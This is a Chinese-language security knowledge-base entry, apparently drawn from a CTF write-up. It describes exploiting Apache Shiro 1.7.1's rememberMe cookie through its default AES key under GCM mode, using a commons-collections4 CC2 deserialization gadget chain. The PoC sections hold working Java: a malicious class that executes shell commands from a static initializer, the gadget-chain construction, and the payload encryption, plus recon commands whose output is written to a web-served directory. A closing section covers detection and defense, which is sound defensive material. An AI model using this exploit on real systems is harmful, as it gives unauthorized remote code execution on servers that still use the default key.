---
id: web-java-framework-shiro-rememberme-aes-gcm-cc2-cross-jdk
title: Shiro 1.7.1 默认密钥 + AES-GCM rememberMe：跨 JDK 构造 commons-collections4 CC2 链写文件回显
type: scenario
domain: web
path: web/java/framework/shiro
technique: shiro-rememberme-aes-gcm-cc2-cross-jdk
aliases:
- Shiro 1.7.1 rememberMe
- Shiro AES-GCM 反序列化
- CC2 commons-collections4
- 跨 JDK 序列化兼容
- TemplatesImpl 假 stub
tags:
- java
- shiro
- deserialization
- rememberme
- aes-gcm
- cc2
- commons-collections4
- templatesimpl
- cross-jdk
- rce
cve:
- CVE-2016-4437
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V117
  verified_at: '2026-11-06T01:52:04+08:00'
  notes: 已对照原文「安全笔记」核对：Shiro 1.7.1、JDK 8u492、debug 接口泄露 shiro_cipher_key=kPH+bIxk5D2deZiIxcaaaA==、gadget_hint=commons-collections4、导出目录 /tmp/securenotes/public 映射 /<filename>；GCM Cookie 结构 base64(IV||ct||tag)、CC2(PriorityQueue+TransformingComparator+TemplatesImpl)、无害 transformer 先构造再替换、serialVersionUID 673094361519270707、_tfactory transient、class version 52 与假 AbstractTranslet stub 均与原文一致；两次写文件回显链吻合。说明：CVE-2016-4437 原对应 Shiro 旧版硬编码密钥，本题 1.7.1 是应用沿用了该默认 key，CVE 关联属同类手法而非版本匹配；未复跑；frontmatter 无 sources/source_url。
---

## 一句话结论

Shiro 1.7.1 即使升级到 AES-GCM 的 rememberMe 加密，只要应用仍使用默认密钥 `kPH+bIxk5D2deZiIxcaaaA==`，攻击者就能按 `base64(16 字节 IV || AES-GCM 密文+tag)` 构造 payload；目标只依赖 commons-collections4-4.0 时选用 CC2 链（PriorityQueue + TransformingComparator + TemplatesImpl），并通过显式 serialVersionUID、假 AbstractTranslet stub、`javac --release 8` 解决本地高版本 JDK 与目标 JDK 8 的序列化兼容问题，最终执行命令并把结果写到静态目录回显。

## 原理

- **默认密钥跨版本残留**：Shiro >= 1.2.5 默认不再硬编码密钥，但大量应用仍沿用示例密钥 `kPH+bIxk5D2deZiIxcaaaA==`；只要密钥未改，rememberMe 反序列化入口在 1.7.1 上依然成立。
- **加密模式随版本变化**：Shiro >= 1.4.2 的 `AesCipherService` 默认使用 AES-GCM；Cookie 结构为 `base64(IV || ciphertext || tag)`，与旧版 AES-CBC 的 `base64(IV || ciphertext)` 不同，按旧格式构造会解密失败。
- **CC2 链适配 commons-collections4**：4.x 中 `TransformingComparator` 实现了 `Serializable`，因此可用 `PriorityQueue.readObject()` → `TransformingComparator.compare()` → `InvokerTransformer("newTransformer").transform()` → `TemplatesImpl.newTransformer()` → `defineClass(恶意类)` → `static {}` 执行命令。
- **本地触发规避**：构造 `PriorityQueue` 时先用无害的 `InvokerTransformer("toString")` 让 `add()` 完成本地插入，序列化前再反射把 `transformer` 换成 `newTransformer`，否则本地 `compare()` 就会提前触发。
- **跨 JDK 兼容**：`TemplatesImpl` 的 `serialVersionUID` 是显式声明的 `673094361519270707`，跨 JDK 稳定；流中多出的字段（如 `_indentNumber`）会被目标静默丢弃，缺失字段走默认值；`_tfactory` 是 transient，目标端 `readObject` 会自行创建 `TransformerFactoryImpl`，无需写入。
- **编译约束**：恶意类字节码必须是 class version 52（`javac --release 8`）；本地 JDK 不导出 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`，用一个同全限定名的空 stub 编译即可，class 文件只记录父类名字符串，运行时在目标端解析到真类。
- **回显通道**：命令把结果写到应用可静态访问的导出目录（本题 `/tmp/securenotes/public` 映射为 `/<文件名>`），再通过 HTTP 读取。

## 触发条件

- 目标使用 Shiro rememberMe，且密钥仍为默认/弱密钥（可由 `/api/debug/env` 等调试接口、配置文件泄漏或字典爆破获得）。
- Shiro 版本 >= 1.4.2（AES-GCM）且 < 修复版本，或虽为新版但未更换密钥。
- classpath 存在 commons-collections4（本题 4.0），提供 CC2 所需类。
- 目标 JDK 允许 `TemplatesImpl` 定义类（JDK 8 常见）；恶意类版本不高于目标 JDK 支持。
- 存在可写且可静态访问的目录用于回显，或无回显时可用 DNS/HTTP 外带。

## 利用步骤

1. 识别 Shiro：登录页有 `rememberMe`、响应出现 `rememberMe=deleteMe`；访问调试接口获取 `shiro_version`、`jdk_version`、`shiro_cipher_key`、`gadget_hint`。
2. 确认加密模式：Shiro >= 1.4.2 用 AES-GCM；按 `base64(IV || ciphertext+tag)` 构造 Cookie。
3. 编译恶意类：`javac --release 8` 编译继承假 `AbstractTranslet` stub 的类，静态块执行命令；命令可先做侦察（`id; ls; env; find / -iname '*flag*'`）并写到导出目录。
4. 构造 CC2：反射设置 `TemplatesImpl._bytecodes/_name`；用无害 transformer 构建 `PriorityQueue` 并 add 两次；反射替换 `TransformingComparator.transformer` 为 `newTransformer`。
5. 序列化并加密：`AES/GCM/NoPadding`、128 位 tag、随机 16 字节 IV，`iv || ct` 后 Base64。
6. 发送 `Cookie: rememberMe=<payload>`，访问任意路径触发反序列化。
7. 通过静态目录读取命令输出；必要时二次 payload 读取 flag 文件。

## PoC

恶意类模板：

```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

public class Pwn extends AbstractTranslet {
    static {
        try {
            String[] cmd = new String[]{"/bin/sh", "-c", "__CMD__"};
            Runtime.getRuntime().exec(cmd);
        } catch (Throwable t) { }
    }
    public Pwn() { }
}
```

CC2 关键构造与 GCM 加密：

```java
byte[] cls = Files.readAllBytes(Paths.get(args[0]));
Class<?> tc = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
Object templates = tc.getDeclaredConstructor().newInstance();
setField(tc, templates, "_bytecodes", new byte[][]{cls});
setField(tc, templates, "_name", "Pwn");

InvokerTransformer<Object,Object> innocent =
    new InvokerTransformer<>("toString", new Class[0], new Object[0]);
TransformingComparator<Object,Object> comp = new TransformingComparator<>(innocent);
PriorityQueue<Object> q = new PriorityQueue<>(2, comp);
q.add(templates);
q.add(templates);

Field tf = TransformingComparator.class.getDeclaredField("transformer");
tf.setAccessible(true);
tf.set(comp, new InvokerTransformer<>("newTransformer", new Class[0], new Object[0]));

byte[] ser = serialize(q);
byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
byte[] iv = new byte[16];
new SecureRandom().nextBytes(iv);
Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, iv));
byte[] ct = c.doFinal(ser);
// rememberMe = base64(iv || ct)
```

原文实测：第一发 payload 将 `id; ls -la /; env; find / -iname '*flag*'` 写入 `/tmp/securenotes/public/o.txt`，`GET /o.txt` 返回 root 身份与 `FLAG=flag{...}`；第二发 `cat /flag` 写入 `f.txt` 后读取成功。未在本机复跑。

## 变体与关联

- **加密模式变体**：Shiro <= 1.2.4 用 AES-CBC（`base64(IV||ct)`）；>= 1.4.2 用 AES-GCM（`base64(IV||ct||tag)`）。按错模式会直接解密失败。
- **Gadget 变体**：无 commons-collections4 时改用 CommonsBeanutils、CC6、JNDI 等；CC2/CC4 依赖 `TemplatesImpl`，受 JDK 模块封装影响。
- **跨版本兼容**：用显式 serialVersionUID、字段增删容忍、transient `_tfactory`、class version 52 与假 stub 让本地高版本 JDK 生成的流在目标 JDK 8 上可用。
- **回显变体**：写静态目录、DNS/HTTP 外带、内存马注入。
- **关联**：[[web-java-deser-commonscollections-cc4-priorityqueue-templatesimpl]]（CC2/CC4 链细节）、[[web-java-framework-shiro-550-hardcoded-key-deserialization]]（默认密钥问题）、[[web-java-framework-shiro-721-padding-oracle]]（密钥随机时的替代路径）。

## 检测与防御

- 更换默认密钥为强随机值并定期轮换；不需要 rememberMe 时关闭。
- 升级 Shiro 至修复版本，关注 rememberMe 反序列化白名单与 `ObjectInputStream` 过滤。
- 移除不必要的 gadget 依赖（commons-collections4 等），或使用类加载白名单。
- 检测：超长 `rememberMe` Cookie、`rememberMe=deleteMe` 反复出现、反序列化异常、`TemplatesImpl`/`PriorityQueue`/`TransformingComparator` 类名、应用进程创建异常子进程、静态导出目录出现命令输出文件。
- 收敛调试接口：`/api/debug/env` 不应暴露密钥、版本与 gadget 提示；生产环境关闭 debug 端点。
